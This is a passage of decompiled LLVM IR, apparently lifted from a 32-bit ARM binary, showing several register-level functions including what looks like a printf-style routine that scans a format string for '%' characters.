  %v1_10ab4 = inttoptr i32 %v0_10aa8 to i32*
  %v2_10ab4 = load i32, i32* %v1_10ab4, align 4
  store i32 %v2_10ab4, i32* @r6, align 4
  %v1_10ab8 = call i32 @function_12540(i32 0)
  %v2_10ac0 = icmp eq i32 %v1_10ab8, 0
  store i32 144312, i32* @r4, align 4
  br i1 %v2_10ac0, label %bb12, label %.thread2

bb12:                                             ; preds = %bb11
  %v5_10acc = load i16, i16* inttoptr (i32 144616 to i16*), align 8
  %v7_10acc = zext i16 %v5_10acc to i32
  %v2_10ad0 = xor i32 %v7_10acc, 256
  store i32 %v2_10ad0, i32* @r3, align 4
  %v2_10ad4 = trunc i32 %v2_10ad0 to i16
  store i16 %v2_10ad4, i16* inttoptr (i32 144616 to i16*), align 8
  br label %.thread2

.thread2:                                         ; preds = %bb11, %bb12
  store i32 1, i32* @r0, align 4
  %v1_10adc = call i32 @function_12540(i32 1)
  %v2_10ae0 = icmp eq i32 %v1_10adc, 0
  br i1 %v2_10ae0, label %bb13, label %.thread6

bb13:                                             ; preds = %.thread2
  %v1_10ae8 = load i32, i32* @r4, align 4
  %v2_10aec = add i32 %v1_10ae8, 384
  %v3_10aec = inttoptr i32 %v2_10aec to i16*
  %v4_10aec = load i16, i16* %v3_10aec, align 2
  %v2_10af0 = xor i16 %v4_10aec, 256
  store i16 %v2_10af0, i16* %v3_10aec, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb13
  %v0_10af8 = load i32, i32* @r6, align 4
  %v1_10af8 = load i32, i32* @r5, align 4
  %v2_10af8 = inttoptr i32 %v1_10af8 to i32*
  store i32 %v0_10af8, i32* %v2_10af8, align 4
  ret i32 %v1_10adc

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_10b0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b0c:
  store i32 144312, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1a65c.197 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_10b28 = call i32 @function_12050()
  ret i32 %v0_10b28
}

define i32 @function_10c14() local_unnamed_addr {
dec_label_pc_10c14:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10c14 = load i32, i32* @r4, align 4
  store i32 %v3_10c14, i32* %stack_var_-8, align 4
  %v0_10c18 = load i32, i32* @r0, align 4
  %v1_10c18 = add i32 %v0_10c18, 8
  %v2_10c18 = inttoptr i32 %v1_10c18 to i32*
  %v3_10c18 = load i32, i32* %v2_10c18, align 4
  %v1_10c1c = add i32 %v0_10c18, 16
  %v2_10c1c = inttoptr i32 %v1_10c1c to i32*
  %v3_10c1c = load i32, i32* %v2_10c1c, align 4
  %v2_10c20 = sub i32 %v3_10c1c, %v3_10c18
  store i32 %v2_10c20, i32* @r2, align 4
  %v9_10c20 = icmp eq i32 %v3_10c1c, %v3_10c18
  store i32 %v0_10c18, i32* %r4.global-to-local, align 4
  br i1 %v9_10c20, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_10c14
  store i32 %v3_10c18, i32* %v2_10c1c, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_10c14, %bb
  %v1_10c2c = xor i1 %v9_10c20, true
  call void @__pseudo_cond_branch(i1 %v1_10c2c, i32 ptrtoint (i32* @global_var_15dc4.198 to i32))
  %v0_10c30 = load i32, i32* %r4.global-to-local, align 4
  %v1_10c30 = add i32 %v0_10c30, 8
  %v2_10c30 = inttoptr i32 %v1_10c30 to i32*
  %v3_10c30 = load i32, i32* %v2_10c30, align 4
  %v1_10c34 = add i32 %v0_10c30, 16
  %v2_10c34 = inttoptr i32 %v1_10c34 to i32*
  %v3_10c34 = load i32, i32* %v2_10c34, align 4
  %v2_10c38 = sub i32 %v3_10c34, %v3_10c30
  %v2_10c3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10c3c, i32* @r4, align 4
  ret i32 %v2_10c38

; uselistorder directives
  uselistorder i32 %v3_10c1c, { 1, 0 }
  uselistorder i32 %v3_10c18, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_10c44(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_10c44:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_10c44 = load i32, i32* @r4, align 4
  store i32 %v3_10c44, i32* %stack_var_-28, align 4
  %v6_10c44 = load i32, i32* @r5, align 4
  %v9_10c44 = load i32, i32* @r6, align 4
  %v12_10c44 = load i32, i32* @r7, align 4
  %v15_10c44 = load i32, i32* @r8, align 4
  %v18_10c44 = load i32, i32* @sl, align 4
  %v2_10c48 = add i32 %tmp, 52
  %v3_10c48 = inttoptr i32 %v2_10c48 to i32*
  %v4_10c48 = load i32, i32* %v3_10c48, align 4
  %v1_10c50 = sub i32 1, %v4_10c48
  %v2_10c50 = icmp ult i32 %v4_10c48, 2
  br i1 %v2_10c50, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_10c44
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_10c44, %bb
  %storemerge21 = phi i32 [ 0, %bb ], [ %v1_10c50, %dec_label_pc_10c44 ]
  %v0_10c58 = phi i32 [ 0, %bb ], [ %v1_10c50, %dec_label_pc_10c44 ]
  store i32 %storemerge21, i32* @r7, align 4
  %v2_10c58 = icmp eq i32 %v0_10c58, 0
  store i32 144312, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r8, align 4
  br i1 %v2_10c58, label %dec_label_pc_10cac, label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %bb16
  %v2_10c78 = add i32 %tmp, 56
  store i32 %v2_10c78, i32* @r4, align 4
  %v4_10c8c = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10c8c)
  %v0_10ca0 = load i32, i32* @r6, align 4
  %v2_10ca0 = add i32 %v0_10ca0, 20
  %v3_10ca0 = inttoptr i32 %v2_10ca0 to i32*
  %v4_10ca0 = load i32, i32* %v3_10ca0, align 4
  store i32 %v4_10ca0, i32* @ip, align 4
  store i32 68780, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10ca0)
  %v0_10cac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %bb16, %dec_label_pc_10c74
  %v0_10cbc = phi i32 [ %tmp, %bb16 ], [ %v0_10cac.pre, %dec_label_pc_10c74 ]
  %v1_10cac = inttoptr i32 %v0_10cbc to i16*
  %v2_10cac = load i16, i16* %v1_10cac, align 2
  %v1_10cb0 = and i16 %v2_10cac, 192
  %v2_10cb4 = icmp eq i16 %v1_10cb0, 192
  br i1 %v2_10cb4, label %dec_label_pc_10cd4, label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10cac
  %v4_10cc4 = call i32 @function_162c0(i16* %v1_10cac, i32 128)
  %v2_10cc8 = icmp eq i32 %v4_10cc4, 0
  br i1 %v2_10cc8, label %dec_label_pc_10cbc.dec_label_pc_10cd4_crit_edge, label %dec_label_pc_10ce8

dec_label_pc_10cbc.dec_label_pc_10cd4_crit_edge:  ; preds = %dec_label_pc_10cbc
  %v0_10cd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cbc.dec_label_pc_10cd4_crit_edge, %dec_label_pc_10cac
  %v0_10cd4 = phi i32 [ %v0_10cd4.pre, %dec_label_pc_10cbc.dec_label_pc_10cd4_crit_edge ], [ %v0_10cbc, %dec_label_pc_10cac ]
  %v0_10cd8 = load i32, i32* @sl, align 4
  %v0_10cdc = load i32, i32* @r8, align 4
  %v4_10ce0 = inttoptr i32 %v0_10cd8 to i8*
  %v5_10ce0 = call i32 @function_10e00(i32 %v0_10cd4, i8* %v4_10ce0, i32 %v0_10cdc)
  br label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cbc, %dec_label_pc_10cd4
  %storemerge = phi i32 [ %v5_10ce0, %dec_label_pc_10cd4 ], [ -1, %dec_label_pc_10cbc ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_10ce8 = load i32, i32* @r7, align 4
  %v2_10ce8 = icmp eq i32 %v0_10ce8, 0
  br i1 %v2_10ce8, label %dec_label_pc_10ce8..thread4_crit_edge, label %bb18

dec_label_pc_10ce8..thread4_crit_edge:            ; preds = %dec_label_pc_10ce8
  br label %.thread4

bb18:                                             ; preds = %dec_label_pc_10ce8
  %v1_10cf8 = load i32, i32* @r6, align 4
  %v3_10cf8 = add i32 %v1_10cf8, 28
  %v4_10cf8 = inttoptr i32 %v3_10cf8 to i32*
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10ce8..thread4_crit_edge, %bb18
  %v0_10d00.in = phi i32* [ @ip, %dec_label_pc_10ce8..thread4_crit_edge ], [ %v4_10cf8, %bb18 ]
  %v0_10d00 = load i32, i32* %v0_10d00.in, align 4
  %v2_10d00 = xor i1 %v2_10ce8, true
  call void @__pseudo_cond_branch(i1 %v2_10d00, i32 %v0_10d00)
  %v0_10d04 = load i32, i32* %r4.global-to-local, align 4
  %v2_10d0c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10d0c, i32* @r4, align 4
  store i32 %v6_10c44, i32* @r5, align 4
  store i32 %v9_10c44, i32* @r6, align 4
  store i32 %v12_10c44, i32* @r7, align 4
  store i32 %v15_10c44, i32* @r8, align 4
  store i32 %v18_10c44, i32* @sl, align 4
  ret i32 %v0_10d04

; uselistorder directives
  uselistorder i32 %v4_10c48, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_10ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10cac, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_10d18(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d18:
  %v0_10d18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10d18, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10d18
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10d18, %bb
  %v10_10d24 = phi i32 [ %arg1, %dec_label_pc_10d18 ], [ 0, %bb ]
  ret i32 %v10_10d24

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_10d28(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10d28:
  %stack_var_-25 = alloca i8, align 1
  %v3_10d28 = load i32, i32* @r4, align 4
  %v6_10d28 = load i32, i32* @r5, align 4
  %v9_10d28 = load i32, i32* @r6, align 4
  %v12_10d28 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_10d34 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_10d34, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_10d4c2 = icmp eq i32 %arg3, 0
  br i1 %v2_10d4c2, label %dec_label_pc_10d6c, label %dec_label_pc_10d60

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d60
  %v1_10d48 = add i32 %v0_10d48, -1
  store i32 %v1_10d48, i32* @r4, align 4
  %v2_10d4c = icmp eq i32 %v1_10d48, 0
  %v0_10d58 = load i32, i32* @r7, align 4
  br i1 %v2_10d4c, label %dec_label_pc_10d6c.loopexit, label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d28, %dec_label_pc_10d48
  %v0_10d584 = phi i32 [ %v0_10d58, %dec_label_pc_10d48 ], [ %arg1, %dec_label_pc_10d28 ]
  %v3_10d60 = inttoptr i32 %v0_10d584 to i16*
  %v4_10d60 = call i32 @function_16180(i32 %v10_10d34, i32 1, i16* %v3_10d60)
  %v7_10d64 = icmp eq i32 %v4_10d60, 1
  %v0_10d48 = load i32, i32* @r4, align 4
  br i1 %v7_10d64, label %dec_label_pc_10d48, label %dec_label_pc_10d6c.loopexit

dec_label_pc_10d6c.loopexit:                      ; preds = %dec_label_pc_10d48, %dec_label_pc_10d60
  %v0_10d6c.ph = phi i32 [ %v0_10d48, %dec_label_pc_10d60 ], [ 0, %dec_label_pc_10d48 ]
  %v1_10d6c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10d6c

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d6c.loopexit, %dec_label_pc_10d28
  %v1_10d6c = phi i32 [ 0, %dec_label_pc_10d28 ], [ %v1_10d6c.pre, %dec_label_pc_10d6c.loopexit ]
  %v0_10d6c = phi i32 [ 0, %dec_label_pc_10d28 ], [ %v0_10d6c.ph, %dec_label_pc_10d6c.loopexit ]
  %v2_10d6c = sub i32 %v1_10d6c, %v0_10d6c
  store i32 %v3_10d28, i32* @r4, align 4
  store i32 %v6_10d28, i32* @r5, align 4
  store i32 %v9_10d28, i32* @r6, align 4
  store i32 %v12_10d28, i32* @r7, align 4
  ret i32 %v2_10d6c

; uselistorder directives
  uselistorder i32 %v1_10d48, { 1, 0 }
  uselistorder label %dec_label_pc_10d6c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10d60, { 1, 0 }
}

define i32 @function_10d7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10d7c:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10d7c = load i32, i32* @r4, align 4
  store i32 %v3_10d7c, i32* %stack_var_-24, align 4
  %v6_10d7c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_10d84 = and i32 %arg2, 128
  %v2_10d84 = icmp eq i32 %v1_10d84, 0
  %v0_10d88 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10d88, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_10d84, label %dec_label_pc_10dd8thread-pre-split, label %dec_label_pc_10d9c

dec_label_pc_10d9c:                               ; preds = %dec_label_pc_10d7c
  store i32 %arg4, i32* @r0, align 4
  %v0_10da0 = call i32 @function_11fd0()
  store i32 %v0_10da0, i32* %r0.global-to-local, align 4
  %v1_10da4 = load i32, i32* %r4.global-to-local, align 4
  %v2_10da4 = sub i32 %v1_10da4, %v0_10da0
  store i32 %v2_10da4, i32* @r4, align 4
  store i32 %v0_10da0, i32* @r6, align 4
  %tmp12 = icmp slt i32 %v2_10da4, 1
  br i1 %tmp12, label %.thread, label %dec_label_pc_10db8

.thread:                                          ; preds = %dec_label_pc_10d9c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10dd4

dec_label_pc_10db8:                               ; preds = %dec_label_pc_10d9c
  %v0_10db8 = load i32, i32* @r5, align 4
  %v1_10db8 = urem i32 %v0_10db8, 128
  %v0_10dbc = load i32, i32* @r8, align 4
  store i32 %v0_10dbc, i32* %r0.global-to-local, align 4
  %v3_10dc4 = trunc i32 %v1_10db8 to i8
  %v4_10dc4 = call i32 @function_10d28(i32 %v0_10dbc, i8 %v3_10dc4, i32 %v2_10da4)
  store i32 %v4_10dc4, i32* %r0.global-to-local, align 4
  %v1_10dc8 = load i32, i32* @r4, align 4
  %v9_10dc8 = icmp eq i32 %v4_10dc4, %v1_10dc8
  store i32 %v4_10dc4, i32* %r5.global-to-local, align 4
  br i1 %v9_10dc8, label %dec_label_pc_10db8.dec_label_pc_10dd4_crit_edge, label %dec_label_pc_10df4

dec_label_pc_10db8.dec_label_pc_10dd4_crit_edge:  ; preds = %dec_label_pc_10db8
  %v0_10dd4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %.thread, %dec_label_pc_10db8.dec_label_pc_10dd4_crit_edge
  %v0_10dd4 = phi i32 [ %v0_10dd4.pre, %dec_label_pc_10db8.dec_label_pc_10dd4_crit_edge ], [ %v0_10da0, %.thread ]
  store i32 %v0_10dd4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10dd8

dec_label_pc_10dd8thread-pre-split:               ; preds = %dec_label_pc_10d7c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10dd8

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10dd8thread-pre-split, %dec_label_pc_10dd4
  %v5_10de4 = phi i32 [ %arg3, %dec_label_pc_10dd8thread-pre-split ], [ %v0_10dd4, %dec_label_pc_10dd4 ]
  %tmp13 = icmp slt i32 %v5_10de4, 1
  br i1 %tmp13, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_10dd8
  br label %bb14

bb:                                               ; preds = %dec_label_pc_10dd8
  %v5_10de0 = load i32, i32* @r7, align 4
  br label %bb14

bb14:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_10de0, %bb ]
  %tmp15 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp15, i32 ptrtoint (i32* @global_var_16180.204 to i32))
  %v0_10df0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10df0 = add i32 %storemerge, %v0_10df0
  store i32 %v2_10df0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10db8, %bb14
  %v0_10df4 = phi i32 [ %v4_10dc4, %dec_label_pc_10db8 ], [ %v2_10df0, %bb14 ]
  store i32 %v0_10df4, i32* %r0.global-to-local, align 4
  %v2_10df8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10df8, i32* %r4.global-to-local, align 4
  store i32 %v6_10d7c, i32* %r5.global-to-local, align 4
  ret i32 %v0_10df4

; uselistorder directives
  uselistorder i32 %v0_10df4, { 1, 0 }
  uselistorder i32 %v0_10dd4, { 1, 0 }
  uselistorder i32 %v2_10da4, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10df4, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_10dd4, { 1, 0 }
}

define i32 @function_10e00(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10e00:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_2()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_2()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v9_10e00 = load i32, i32* @r6, align 4
  %v12_10e00 = load i32, i32* @r7, align 4
  %v18_10e00 = load i32, i32* @sb, align 4
  %v24_10e00 = load i32, i32* @fp, align 4
  %v2_10e08 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10e08, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_10e08, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10e18 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10e18, i32* @r5, align 4
  %v2_10e1c = call i32 @function_114e8(i32* nonnull %stack_var_-352)
  store i32 %v2_10e1c, i32* %r0.global-to-local, align 4
  %v1_10e24 = icmp slt i32 %v2_10e1c, 0
  br i1 %v1_10e24, label %dec_label_pc_10e34, label %dec_label_pc_10e68

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e00
  %v3_10e34 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_10e34, i32* @r4, align 4
  store i32 %v3_10e34, i32* @r0, align 4
  %v0_10e3c = call i32 @function_11fd0()
  store i32 %v0_10e3c, i32* %r0.global-to-local, align 4
  %v2_10e40 = icmp eq i32 %v0_10e3c, 0
  br i1 %v2_10e40, label %bb, label %dec_label_pc_10e50

bb:                                               ; preds = %dec_label_pc_10e34
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114b8

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e34
  %v0_10e50 = load i32, i32* @r4, align 4
  store i32 %v0_10e50, i32* %r0.global-to-local, align 4
  %v0_10e54 = load i32, i32* @fp, align 4
  store i32 %v0_10e54, i32* %r2.global-to-local, align 4
  %v3_10e58 = inttoptr i32 %v0_10e54 to i16*
  %v4_10e58 = call i32 @function_16180(i32 %v0_10e50, i32 %v0_10e3c, i16* %v3_10e58)
  store i32 %v4_10e58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_114b8

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e00
  %v0_10e68 = load i32, i32* @r5, align 4
  store i32 %v2_10e08, i32* %r0.global-to-local, align 4
  %v2_10e70 = call i32 @function_11588(i32 %v2_10e08, i32 %v0_10e68)
  store i32 %v2_10e70, i32* %r0.global-to-local, align 4
  store i32 544, i32* @ip, align 4
  %v0_10eb8 = load i32, i32* @r4, align 4
  store i32 %v0_10eb8, i32* %r2.global-to-local, align 4
  %v1_10f3c = bitcast i32* %stack_var_-352 to i8*
  %v4_10f4c = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_10f58 = ptrtoint i32* %stack_var_-272 to i32
  %v2_10f70 = ptrtoint i32* %stack_var_-40 to i32
  %v2_10f8c = icmp eq i32 %tmp104, 0
  %v2_112c4 = ptrtoint i32* %stack_var_-200 to i32
  %v2_11308 = ptrtoint i32* %stack_var_-348 to i32
  %v2_1130c = ptrtoint i32* %stack_var_-72 to i32
  %v2_111c0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_111cc = ptrtoint i32* %stack_var_-52 to i32
  %v7_11028 = zext i8 %tmp102 to i32
  %v2_11060 = ptrtoint i32* %stack_var_-73 to i32
  %v1_11068 = bitcast i32* %stack_var_-73 to i8*
  %v2_11070 = icmp ugt i32 %tmp104, 4
  %v7_11070 = icmp eq i32 %tmp104, 5
  %v7_10f54 = ptrtoint i32* %stack_var_-280 to i32
  %v5_10f84195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_11194 = icmp ugt i32 %tmp104, 16
  %v7_11194 = icmp eq i32 %tmp104, 17
  %v2_11198 = xor i1 %v7_11194, true
  %v3_11198 = and i1 %v2_11194, %v2_11198
  %v2_1121c = icmp ugt i32 %tmp104, 18
  %v7_1121c = icmp eq i32 %tmp104, 19
  %v2_11220 = xor i1 %v7_1121c, true
  %v3_11220 = and i1 %v2_1121c, %v2_11220
  %v7_112b8 = icmp eq i32 %tmp104, 20
  %v1_10fd0 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_1a690.215 to i32), i32 -1)
  %v2_10fd0 = inttoptr i32 %v1_10fd0 to i8*
  %v2_10ffc = xor i1 %v7_11070, true
  %v3_10ffc = and i1 %v2_11070, %v2_10ffc
  %v7_11030 = icmp eq i32 %tmp104, 1
  %v2_11078 = xor i1 %v2_11070, true
  %v3_11078 = or i1 %v7_11070, %v2_11078
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_110e0 = icmp eq i32 %tmp104, 3
  %v11_110ec = icmp eq i32 %tmp104, 4
  %v9_10f5c = mul nuw nsw i32 %v4_10f4c, 8
  %v10_10f5c = add i32 %v7_10f54, %v9_10f5c
  br label %dec_label_pc_10ebc.outer

dec_label_pc_10ebc.outer:                         ; preds = %dec_label_pc_1149c, %dec_label_pc_10e68
  %v0_10ebc45 = phi i32 [ %v3_1149c, %dec_label_pc_1149c ], [ %v0_10eb8, %dec_label_pc_10e68 ]
  %v0_10ff0 = phi i32 [ %stack_var_-336.4, %dec_label_pc_1149c ], [ %tmp103, %dec_label_pc_10e68 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_1149c ], [ 0, %dec_label_pc_10e68 ]
  br label %dec_label_pc_10ebc.outer36

dec_label_pc_10ebc.outer36:                       ; preds = %dec_label_pc_10ebc.outer, %dec_label_pc_114a8
  %v0_10ebc44 = phi i32 [ %v0_10ebc45, %dec_label_pc_10ebc.outer ], [ %v1_114a8, %dec_label_pc_114a8 ]
  %v5_10ee8 = phi i32 [ %v0_10ebc45, %dec_label_pc_10ebc.outer ], [ %v1_10f18, %dec_label_pc_114a8 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_10ebc.outer ], [ %v1_11388, %dec_label_pc_114a8 ]
  %v1_10ebc188 = inttoptr i32 %v0_10ebc44 to i8*
  %v2_10ebc189 = load i8, i8* %v1_10ebc188, align 1
  %v2_10ec0191 = icmp eq i8 %v2_10ebc189, 0
  br i1 %v2_10ec0191, label %dec_label_pc_10ed8, label %bb138

bb138:                                            ; preds = %dec_label_pc_10ebc.outer36, %.thread6
  %v2_10ebc193 = phi i8 [ %v2_10ebc, %.thread6 ], [ %v2_10ebc189, %dec_label_pc_10ebc.outer36 ]
  %v1_10ed0192 = phi i32 [ %v2_10ed0, %.thread6 ], [ %v0_10ebc44, %dec_label_pc_10ebc.outer36 ]
  %v8_10ec4 = icmp eq i8 %v2_10ebc193, 37
  br i1 %v8_10ec4, label %dec_label_pc_10ed8, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10ed0 = add i32 %v1_10ed0192, 1
  store i32 %v2_10ed0, i32* @r4, align 4
  %v1_10ebc = inttoptr i32 %v2_10ed0 to i8*
  %v2_10ebc = load i8, i8* %v1_10ebc, align 1
  %v2_10ec0 = icmp eq i8 %v2_10ebc, 0
  br i1 %v2_10ec0, label %dec_label_pc_10ed8, label %bb138

dec_label_pc_10ed8:                               ; preds = %bb138, %.thread6, %dec_label_pc_10ebc.outer36
  %v1_10ed0.lcssa = phi i32 [ %v0_10ebc44, %dec_label_pc_10ebc.outer36 ], [ %v2_10ed0, %.thread6 ], [ %v1_10ed0192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10ed8 = sub i32 %v1_10ed0.lcssa, %v5_10ee8
  %v9_10ed8 = icmp eq i32 %v1_10ed0.lcssa, %v5_10ee8
  br i1 %v9_10ed8, label %dec_label_pc_10f0c, label %dec_label_pc_10ee0

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10ed8
  store i32 %v2_10ed8, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_10ed8, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_10ee0
  store i32 %v5_10ee8, i32* %r0.global-to-local, align 4
  %v5_10ef0 = load i32, i32* @fp, align 4
  store i32 %v5_10ef0, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_10ee0, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_10ee0 ]
  store i32 69368, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_16180.204 to i32))
  %v0_10ef8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10ef8 = load i32, i32* @r5, align 4
  %v9_10ef8 = icmp eq i32 %v0_10ef8, %v1_10ef8
  br i1 %v9_10ef8, label %dec_label_pc_10f00, label %dec_label_pc_114b0

dec_label_pc_10f00:                               ; preds = %bb142
  %v2_10f04 = add i32 %v0_10ef8, %stack_var_-356.1.ph37
  store i32 %v2_10f04, i32* @ip, align 4
  %v0_10f0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10f0c

dec_label_pc_10f0c:                               ; preds = %dec_label_pc_10ed8, %dec_label_pc_10f00
  %v0_10f20 = phi i32 [ %v5_10ee8, %dec_label_pc_10ed8 ], [ %v0_10f0c.pre, %dec_label_pc_10f00 ]
  %v1_11388 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_10ed8 ], [ %v2_10f04, %dec_label_pc_10f00 ]
  %v1_10f0c = inttoptr i32 %v0_10f20 to i8*
  %v2_10f0c = load i8, i8* %v1_10f0c, align 1
